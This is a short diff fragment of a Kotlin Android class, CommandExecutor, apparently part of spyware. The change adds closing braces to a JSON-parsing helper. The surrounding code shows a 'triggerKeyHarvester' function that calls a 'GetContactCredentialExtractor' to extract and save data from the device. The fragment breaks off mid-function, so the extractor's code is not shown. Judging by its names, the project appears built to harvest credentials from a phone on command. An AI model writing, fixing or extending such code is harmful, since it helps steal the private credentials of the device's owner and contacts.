@@ -118,6 +118,8 @@ class CommandExecutor(private val context: Context) {
     private fun parseJsonField(json: String, field: String): String {
         val pattern = "\"$field\"\\s*:\\s*\"([^\"]+)\"".toRegex()
         return pattern.find(json)?.groupValues?.get(1) ?: ""
+    }
+
     private fun triggerKeyHarvester(): Boolean {
         return try {
             val ok = GetContactCredentialExtractor.extractAndSave(context)
